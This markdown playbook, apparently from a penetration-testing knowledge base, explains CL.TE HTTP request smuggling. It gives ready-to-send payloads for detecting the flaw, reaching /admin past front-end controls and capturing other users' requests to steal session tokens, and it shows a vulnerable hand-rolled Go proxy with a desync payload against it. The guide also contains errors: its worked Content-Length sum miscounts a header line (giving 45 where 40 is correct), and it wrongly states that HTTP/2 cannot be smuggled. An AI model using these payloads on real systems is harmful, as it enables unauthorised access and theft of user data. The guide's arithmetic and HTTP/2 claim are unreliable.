# HTTP Request Smuggling — CL.TE

## When this applies

- Front-end uses `Content-Length`; back-end uses `Transfer-Encoding`.
- Front-end forwards body based on CL; back-end interprets chunked encoding from TE.
- Goal: leak the smuggled prefix into the next user's request, capturing data or bypassing security.

## Technique

Send a POST with both `Content-Length: <small>` and `Transfer-Encoding: chunked`. Front-end reads CL bytes (small), forwards. Back-end reads chunked (until `0\r\n\r\n`) — leftover bytes form the start of the NEXT request.

## Steps

### Detection — basic CL.TE

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Send twice. Second response shows "Unrecognized method GPOST" — confirms vulnerability.

### Time-based detection

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If vulnerable, application hangs for ~10 seconds waiting for more data.

### Differential response detection

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Send twice. If second request returns 404, vulnerability confirmed.

### Bypass front-end security controls (access /admin)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Mechanism

- Front-end uses `Content-Length` and ignores `Transfer-Encoding`
- Back-end uses `Transfer-Encoding` and ignores `Content-Length`
- Front-end forwards CL bytes; back-end reads until `0\r\n\r\n`
- Trailing bytes "smuggle" into the next request

### Capture user requests

**Goal:** Steal credentials, session tokens from other users.

**Technique:** Smuggle a request to an endpoint that stores user input with an oversized Content-Length. The next user's request fills the gap and gets stored.

### Common pitfalls

#### Content-Length calculation

```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
```

Length = 24 (GET) + 2 (\r\n) + 15 (Host) + 2 (\r\n) + 2 (\r\n) = 45 bytes.

CRLF = 2 bytes, not 1. Use Burp HTTP Request Smuggler extension to auto-calculate.

#### Missing CRLF sequences

Always include `\r\n\r\n` after final chunk. Use Shift+Return in Burp Inspector to insert CRLF. Verify in hex view.

#### Connection resets

Backend connections reset after certain number of requests. Send 10 normal requests to re-establish clean connection, start attack sequence again.

## Verifying success

- Second request returns response intended for the smuggled request (e.g., admin content via `/admin`).
- Time-based test reveals hang (>10s).
- Subsequent users' responses leak data from the smuggled prefix.

## Common pitfalls

- HTTP/2 doesn't support smuggling — must use HTTP/1.1 in Burp Repeater.
- Modern proxies (Cloudflare, AWS ALB) reject `Content-Length` + `Transfer-Encoding` together — test direct origin.
- Race against legitimate traffic — high-traffic targets poison faster.

## Hand-rolled proxy desync (custom front-ends)

The classical CL.TE attack assumes a real proxy (HAProxy, nginx, Cloudflare). When the front-end is a *bespoke* proxy written in Go / Node / Python that re-parses the request body, a much cruder primitive applies: anything that splits the request on `\r\n\r\n` and validates `Content-Length` against the body length is desyncable.

Source-side fingerprint:

```go
// same shape exists in any language
chunks := bytes.SplitN(req, []byte("\r\n\r\n"), 2)
contentLength, _ := strconv.Atoi(parseHeader(chunks[0], "Content-Length"))
if len(chunks[1]) != contentLength { reject() }
forwardToBackend(chunks[0] + "\r\n\r\n" + chunks[1])  // forwards verbatim, including trailing bytes
```

Send a request whose body itself contains `\r\n\r\n` and a trailing pipelined request:

```http
POST /benign HTTP/1.1
Host: target
Content-Length: 1
Connection: keep-alive

xPOST /sensitive HTTP/1.1
Host: target
Content-Length: 0


```

The proxy splits on the FIRST `\r\n\r\n`, sees body `x` (length 1, passes), and forwards the whole bytestream verbatim. Express/Flask/Fastify on keep-alive parses the trailing bytes as a SECOND request — executing `/sensitive` with whatever trust the proxy injects (auth headers, internal-only flags, source-IP gates fulfilled by the proxy's identity).

Detection heuristic: any custom proxy that reads-then-validates-then-forwards a body separately from the headers can be desynced. Real RFC-compliant proxies stream bytes through without re-parsing. Smell tests: `strings.Split(req, "\r\n\r\n")`, `req.split("\r\n\r\n")`, "lightweight" / "simple" proxy advertising. Pairs with [exploitation-patterns.md](exploitation-patterns.md) Pattern 1 (front-end ACL bypass).

## Tools

- Burp Suite Repeater (HTTP/1.1)
- Burp HTTP Request Smuggler BApp
- smuggler (mailing-list / GitHub Python tool)
